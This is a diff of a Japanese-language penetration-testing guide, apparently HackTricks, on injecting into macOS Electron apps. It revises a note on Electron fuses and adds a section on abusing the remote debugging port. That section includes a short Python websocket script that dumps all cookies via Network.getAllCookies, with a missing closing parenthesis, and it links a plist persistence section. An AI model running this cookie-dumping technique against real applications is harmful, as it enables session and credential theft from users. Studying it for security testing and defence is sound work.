@@ -170,14 +170,24 @@ require('child_process').execSync('/System/Applications/Calculator.app/Contents/
 {% endcode %}
 
 {% hint style="danger" %}
-もしfuse**`EnableNodeCliInspectArguments`**が無効になっている場合、アプリは起動時に`--inspect`のようなノードパラメータを**無視**します。ただし、環境変数**`ELECTRON_RUN_AS_NODE`**が設定されている場合は、それも**無視**されます。fuse**`RunAsNode`**も無効になっている場合は、前述のペイロードを使用して他のプロセスを実行することはできません。
+もしfuse**`EnableNodeCliInspectArguments`**が無効になっている場合、アプリは起動時に`--inspect`のようなノードパラメータを**無視**します。ただし、環境変数**`ELECTRON_RUN_AS_NODE`**が設定されている場合は、それも**無視**されます。これはfuse**`RunAsNode`**が無効になっている場合も同様です。
 
-ただし、引き続きelectronパラメータ`--remote-debugging-port=9229`を使用することはできますが、前述のペイロードでは他のプロセスを実行することはできません。
+ただし、引き続き**electronパラメータ`--remote-debugging-port=9229`**を使用することはできますが、前述のペイロードでは他のプロセスを実行することはできません。
 {% endhint %}
 
-### アプリPlistからのインジェクション
+パラメータ**`--remote-debugging-port=9222`**を使用すると、Electronアプリからいくつかの情報を盗むことができます。例えば、**履歴**（GETコマンドを含む）やブラウザの**クッキー**（ブラウザ内で**復号**され、それらを提供する**JSONエンドポイント**が存在します）です。
 
-これらのキーを追加して持続性を維持するために、この環境変数をplistで悪用することができます：
+これについては、[**こちら**](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e)と[**こちら**](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f)で学ぶことができます。また、自動ツール[WhiteChocolateMacademiaNut](https://github.com/slyd0g/WhiteChocolateMacademiaNut)や以下のようなシンプルなスクリプトを使用することもできます：
+```python
+import websocket
+ws = websocket.WebSocket()
+ws.connect("ws://localhost:9222/devtools/page/85976D59050BFEFDBA48204E3D865D00", suppress_origin=True)
+ws.send('{\"id\": 1, \"method\": \"Network.getAllCookies\"}')
+print(ws.recv()
+```
+### アプリのPlistからのインジェクション
+
+これらのキーを追加して永続性を維持するために、この環境変数をPlistで悪用することができます：
 ```xml
 <dict>
 <key>ProgramArguments</key>
